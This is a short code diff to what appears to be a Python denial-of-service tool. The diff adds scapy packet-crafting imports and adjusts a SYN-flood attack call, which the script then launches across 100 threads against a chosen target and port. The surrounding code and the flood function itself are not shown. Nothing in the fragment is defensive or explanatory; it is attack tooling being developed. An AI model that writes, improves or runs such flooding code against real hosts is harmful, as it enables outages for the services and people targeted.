@@ -3,10 +3,12 @@ import threading as th
 import time
 import sys
 import os
+from scapy.all import IP, TCP, send, RandShort
 import random
 import test_lib as ty
 import platform
 import ping3
+from scapy.all import *
 
 choices = [1, 2, 3]
 Threads = []
@@ -45,7 +47,7 @@ try:
         if subtype1 == 1:
             print("Now u have 10 second for end the attack... \n")
             time.sleep(10)
-            Syn_flood = protocolAttack.syn_flood(vector, bye, port)
+            Syn_flood = protocolAttack.syn_flood(vector, port)
             for i in range(100):
                 t = th.Thread(target=Syn_flood, args=(i,))
                 Threads.append(t)
